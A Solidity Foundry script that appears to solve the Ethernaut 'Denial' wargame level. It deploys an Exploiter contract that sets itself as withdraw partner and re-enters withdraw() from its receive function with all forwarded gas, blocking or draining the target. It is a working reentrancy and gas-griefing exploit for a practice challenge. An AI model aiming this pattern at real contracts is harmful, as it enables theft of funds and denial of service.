// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script} from "forge-std/Script.sol";

contract Deployer is Script {
    function run() external {
        vm.startBroadcast();
        new Exploiter(0x6185Be5dF343C299f9424B96A22296A5D4adcb10);
        vm.stopBroadcast();
    }
}

contract Exploiter {
    address public immutable denial;    

    constructor(address _instance) {
        denial = _instance;
    }

    function setPartner() external {
        IDenial(denial).setWithdrawPartner(address(this));
    }

    function exploit() external {
        _callContract(100);
    }

    function _callContract(uint8 _limit) internal {
        if (denial.balance > _limit && !_call()) { 
            _callContract(_limit--);
        }
    }

    function _call() internal returns (bool success) {
        address target = denial;
        assembly {
            // Allocate memory for call
            let ptr := mload(0x40)
        
            // Store function selector
            mstore(ptr, 0x3ccfd60b00000000000000000000000000000000000000000000000000000000)
        
            // Call the contract
            success := call(
                gas(),           // Forward all gas
                target,          // Target address
                0,               // No ETH value
                ptr,             // Input data pointer
                4,               // Input data length (4 bytes for selector)
                0,               // Output data pointer
                0                // Output data length
            )
        }
    }

    receive() external payable {
        _callContract(100);
    }
}

interface IDenial {
    function setWithdrawPartner(address _partner) external;
    function withdraw() external;
    function partner() external view returns (address);
    function contractBalance() external view returns (uint256);
}
